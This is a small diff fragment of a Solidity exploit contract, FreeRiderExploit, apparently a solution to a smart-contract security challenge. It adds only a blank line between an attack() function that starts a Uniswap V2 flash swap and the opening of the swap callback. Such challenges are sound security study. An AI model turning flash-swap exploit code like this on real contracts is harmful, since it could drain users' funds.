@@ -192,6 +192,7 @@ contract FreeRiderExploit {
     function attack() public {
         pair.swap(PRICE, 0, address(this), abi.encode(PRICE));
     }
+
     function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
         require(msg.sender == address(pair), "not pair");
 
